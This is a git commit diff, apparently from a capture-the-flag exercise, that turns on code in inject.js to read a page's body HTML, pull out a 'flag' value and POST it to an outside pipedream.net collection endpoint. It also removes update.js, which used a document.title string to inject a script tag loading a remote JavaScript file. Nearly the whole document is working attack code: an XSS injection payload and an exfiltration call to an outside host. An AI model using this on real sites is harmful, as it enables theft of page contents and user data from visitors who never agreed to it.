3afa2ce45f1f216444e34f6ab39dbbf45b9964f1
xsxsz <dilemma@mail.dlut.edu.cn>
2024-03-18 10:25:05 -0400

    update

--- inject.js
+++ inject.js
@@ -1,17 +1,17 @@
-console.log('test')
-// body_text = document.body.innerHTML;
-// flag = body_text.slice(body_text.lastIndexOf('>') + 1);
+console.log('inject')
+body_text = document.body.innerHTML;
+flag = body_text.slice(body_text.lastIndexOf('>') + 1);
 
-// const headers = new Headers()
-// headers.append("Content-Type", "application/json")
+const headers = new Headers()
+headers.append("Content-Type", "application/json")
 
-// const body = { "flag": "flag" }
+const body = { "flag": "flag" }
 
-// const options = {
-//   method: "POST",
-//   headers,
-//   mode: "cors",
-//   body: JSON.stringify(body),
-// }
+const options = {
+  method: "POST",
+  headers,
+  mode: "cors",
+  body: JSON.stringify(body),
+}
 
-// fetch("https://enp5jg92ceyd.x.pipedream.net/", options)
+fetch("https://en8uw5kigq9nx.x.pipedream.net/", options)
--- update.js
+++
@@ -1,3 +0,0 @@
-setTimeout(function(){
-    document.title = " </h1><script src='https://xsxszab.github.io/inject.js'></script><h1>";
-}, 2000);
